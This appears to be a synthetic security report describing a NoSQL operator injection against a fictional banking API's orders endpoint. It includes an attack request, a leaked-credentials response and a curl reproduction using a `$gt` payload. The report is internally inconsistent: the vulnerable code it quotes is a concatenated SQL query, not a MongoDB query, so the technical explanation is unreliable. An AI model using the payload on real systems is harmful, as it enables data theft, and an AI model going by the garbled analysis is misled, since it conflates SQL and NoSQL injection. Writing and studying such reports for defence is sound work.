# Security Analysis Report
**System:** NexaBank Open Finance API
**Domain:** Financial Services / Retail Banking
**Example ID:** INJ-0002
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | NoSQL Injection | MongoDB operator injection via `category` parameter on `/api/v1/orders` — attacker injects `{"$gt": ""}` to bypass order filter and dump all order records including admin credentials |

---

## Finding 1 — NoSQL Injection: MongoDB Operator Injection

### Summary
The `/api/v1/orders` endpoint on NexaBank Open Finance API (`api.nexabank-open-f.example.com`) constructs a MongoDB query using raw string concatenation (`${req.query.category}`). Per §3.0, §4.0, and §7.0, this legacy endpoint was missed during the parameterization migration. An attacker injects `{ "$gt": "" }` into the `category` parameter — the MongoDB `$gt` (greater-than) operator causes the filter to match all documents where the `category` field is greater than an empty string (any non-empty value), effectively bypassing the equality filter and dumping all order records.

**Pattern:** NoSQL Injection (MongoDB operator injection)
**Affected endpoint:** `GET https://api.nexabank-open-f.example.com/api/v1/orders`
**Vulnerable parameter:** `category`

### Evidence from HAR (§5.0)

**Request — Attack**
```
GET https://api.nexabank-open-f.example.com/api/v1/orders?category={%20"$gt":%20""%20}
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG
Accept: application/json
```

**Injected payload:** `category={ "$gt": "" }` (URL-decoded)

**Response — All Order Records Returned (MongoDB filter bypassed)**
```json
{
  "data": [
    {"id": 1, "username": "admin", "password_hash": "$2b$12$secret", "role": "ADMIN"},
    {"id": 2, "username": "user2", "password_hash": "$2b$12$abc"}
  ]
}
```
Admin credentials exposed: `username: admin`, `password_hash: $2b$12$secret`, `role: ADMIN`. MongoDB operator injection confirmed — category filter bypassed.

**Vulnerable code (§3.0):**
```javascript
const query = `SELECT * FROM orders WHERE category = '${req.query.category}'`;
db.execute(query, (err, results) => { ... });
```

### Steps to Reproduce
```bash
curl -s -G "https://api.nexabank-open-f.example.com/api/v1/orders" \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Accept: application/json" \
  --data-urlencode 'category={ "$gt": "" }'
# Vulnerable: all order records including admin credentials returned
# Secure: {"data": [], "error": "Invalid category parameter"}
```

### Remediation
1. Use MongoDB parameterized query objects — never allow raw user input as a query operator.
2. Validate `category` parameter — reject values containing `$`-prefixed MongoDB operator keys.
3. Remove over-privileged DB account — use least-privilege role.
4. Deploy WAF with NoSQLi detection rules on legacy endpoints.
